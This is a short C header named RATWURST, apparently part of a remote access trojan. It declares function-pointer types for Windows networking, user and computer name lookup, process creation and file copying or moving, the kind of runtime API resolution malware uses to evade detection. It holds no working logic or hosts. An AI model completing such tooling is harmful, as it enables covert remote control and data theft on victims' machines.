#ifndef __RATWURST_H__
#define __RATWURST_H__

typedef SOCKET WSAAPI _socket(int af, int type, int protocol);
typedef int WSAAPI _connect(SOCKET s, const sockaddr *name, int namelen);
typedef int WSAAPI _send(SOCKET s, const char *buf, int len, int flags);
typedef int WSAAPI _closesocket(SOCKET s);
typedef u_short _htons(u_short hostshort);
typedef unsigned long WSAAPI _inet_addr(const char *cp);
typedef int WSAAPI _WSAStartup(WORD wVersionRequested, LPWSADATA lpWSAData);
typedef int _WSACleanup();
typedef int WSAAPI _WSAGetLastError();
typedef int WSAAPI _recv(SOCKET s, char *buf, int len, int flags);
typedef BOOL _GetUserNameA(LPSTR lpBuffer, LPDWORD pcbBuffer);
typedef BOOL _GetComputerNameA(LPSTR lpBuffer, LPDWORD nSize);
typedef UINT _GetSystemDirectoryA(LPSTR lpBuffer, UINT uSize);
typedef DWORD _GetTempPathA(DWORD nBufferLength, LPSTR lpBuffer);
typedef BOOL _CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
typedef HANDLE _CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
typedef DWORD _WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);
typedef BOOL _CloseHandle(HANDLE hObject);
typedef BOOL _WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
typedef BOOL _MoveFileExA(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, DWORD  dwFlags);
typedef BOOL _CopyFileA(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL   bFailIfExists);

#define SOCKET_BUFFER_SIZE 256
#define SPLIT_STRING_ARRAY_SIZE MAX_PATH
#define FILE_SIZE_DIGIT_SIZE 8
#define UNLEN 256

#endif
